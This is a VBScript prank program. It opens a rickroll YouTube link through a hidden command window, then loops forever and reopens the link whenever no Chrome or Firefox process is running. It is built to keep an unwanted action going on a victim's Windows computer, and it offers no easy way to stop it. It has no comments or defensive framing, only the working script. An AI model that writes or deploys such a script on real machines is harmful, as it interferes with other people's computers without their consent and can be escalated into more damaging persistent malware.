Dim objShell
Set objShell = CreateObject("WScript.Shell")

rickrollURL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

objShell.Run "cmd /c start """" """ & rickrollURL & """", 0, True

Do
    WScript.Sleep 1000 
    If Not IsProcessRunning("chrome.exe") And Not IsProcessRunning("firefox.exe") Then
        objShell.Run "cmd /c start """" """ & rickrollURL & """", 0, True
    End If
Loop

Function IsProcessRunning(processName)
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    If colProcesses.Count > 0 Then
        IsProcessRunning = True
    Else
        IsProcessRunning = False
    End If
End Function
